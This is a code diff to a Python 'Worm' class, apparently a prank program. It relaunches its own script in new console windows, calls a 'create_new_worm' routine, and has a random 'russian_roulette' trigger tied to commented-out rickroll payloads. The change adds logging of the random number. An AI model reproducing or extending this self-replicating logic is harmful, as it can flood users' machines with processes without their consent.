@@ -16,6 +16,7 @@ import logging
 import subprocess
 import webbrowser
 import random
+from contextlib import redirect_stdout
 
 #Threading imports - AR
 from threading import Thread, Lock
@@ -197,7 +198,11 @@ class Worm:
             subprocess.Popen([sys.executable, sys.argv[0]], creationflags=subprocess.CREATE_NEW_CONSOLE)
         
     def russian_roulette(self):
-        if ROULETTE == random.randint(0, 2000):
+        num = random.randint(0, 2000)
+        with open('log.txt', 'w') as f:
+            with redirect_stdout(f):
+                print(num)
+        if ROULETTE == num:
             return True
             #self.rick_bomb()
         else:
@@ -213,7 +218,6 @@ class Worm:
         
         try:
             self.create_new_worm()
-            #self.time_to_rick()
         except:
             logging.warning("something went wrong")
         
